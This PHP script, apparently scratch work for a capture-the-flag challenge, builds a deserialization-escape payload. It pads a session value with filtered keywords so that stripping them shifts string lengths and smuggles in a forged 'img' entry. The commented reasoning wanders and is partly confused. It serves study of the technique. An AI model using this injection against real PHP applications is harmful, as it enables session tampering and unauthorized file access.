<?php
// I see! With overflow=0, the injection is just read as the VALUE of function.
// 
// The key insight: we need the overflow to make PHP read past the closing quote,
// and then the next chars should be a valid KEY-VALUE pair!
// 
// Let me trace through with overflow=0:
// 
// function = '";s:3:"img"' (11 bytes)
// 
// Serialized: s:11:"";s:3:"img""
// After filter: s:11:"";s:3:"img""
// 
// PHP reads 11 bytes from ""
// Content: ";s:3:"img"" (11 bytes, but "" is empty, so PHP reads from the next position)
// 
// Wait, the content after "" is: ";s:3:"img""
// 
// Let me trace through more carefully.
// 
// Filtered: a:3:{s:4:"user";s:5:"guest";s:8:"function";s:11:"";s:3:"img"";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// 
// Position 48: " (opening quote of s:11:")
// Position 49: " (closing quote of empty string)
// Position 50: ; (semicolon)
// Position 51: s (start of next element)
// 
// Wait, there's no empty string! The function value is "";s:3:"img""!
// 
// Let me re-examine.
// 
// function = '";s:3:"img"' (11 bytes)
// 
// Serialized: s:11:"";s:3:"img""
// 
// Hmm, this doesn't look right. Let me check the actual serialized string.

function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}

$injection = '";s:3:"img"';

$_SESSION = [];
$_SESSION['user'] = 'guest';
$_SESSION['function'] = $injection;
$_SESSION['img'] = 'Z3Vlc3RfaW1nLnBuZw==';

$serialized = serialize($_SESSION);
echo "Serialized:\n";
echo $serialized . "\n\n";

$filtered = filter($serialized);
echo "Filtered:\n";
echo $filtered . "\n\n";

// Let me parse this manually
echo "Parsing:\n";
$result = unserialize($filtered);
var_dump($result);
echo "\n";

// Now let me try with overflow
// 
// The key insight: we want PHP to read past the closing quote,
// and then the next chars should be a valid KEY-VALUE pair!
// 
// The injection is: ";s:3:"img" (11 bytes)
// 
// After the injection, the remaining content is: ";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// 
// We want PHP to read 11 + X bytes, where X is chosen so that:
// - The (11 + X + 1)th byte is " (closing quote)
// - The next chars after "; are a valid KEY-VALUE pair

// Let me find positions where " appears in the remaining content:
$remaining = '";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}';
echo "Remaining content: $remaining\n";
echo "Positions of \":\n";
for ($i = 0; $i < strlen($remaining); $i++) {
    if ($remaining[$i] === '"') {
        echo "Position $i: \"\n";
    }
}
echo "\n";

// Positions of ": 0, 6, 10, 17, 38
// 
// If we want the (11 + X + 1)th byte to be ", we need:
// 11 + X + 1 = 0, 6, 10, 17, or 38
// 
// 11 + X + 1 = 0 => X = -12 (invalid)
// 11 + X + 1 = 6 => X = -6 (invalid)
// 11 + X + 1 = 10 => X = -2 (invalid)
// 11 + X + 1 = 17 => X = 5 (valid)
// 11 + X + 1 = 38 => X = 26 (valid)

// So we need X = 5 or X = 26 bytes of overflow!
// 
// X = 5: Can't generate with 'flag' (4) or 'php' (3)
// X = 26: 26 / 4 = 6.5 (not integer), 26 / 3 = 8.67 (not integer)
// 
// Hmm, we can't generate exactly 5 or 26 bytes!

// Let me try a combination:
// 26 = 4 * 5 + 3 * 2 = 20 + 6 = 26
// 
// So we need 5 'flag's + 2 'php's = 26 bytes of overflow!

// Let me test this:
$flags = 5;
$phps = 2;
$overflow = 4 * $flags + 3 * $phps;

echo "=== Testing overflow=$overflow (flags=$flags, phps=$phps) ===\n";

$injection = '";s:3:"img"';
$payload = str_repeat('flag', $flags) . str_repeat('php', $phps) . $injection;

$_SESSION = [];
$_SESSION['user'] = 'guest';
$_SESSION['function'] = $payload;
$_SESSION['img'] = 'Z3Vlc3RfaW1nLnBuZw==';

$serialized = serialize($_SESSION);
echo "Serialized:\n";
echo $serialized . "\n\n";

$filtered = filter($serialized);
echo "Filtered:\n";
echo $filtered . "\n\n";

$result = @unserialize($filtered);
echo "Unserialized:\n";
var_dump($result);
echo "\n";

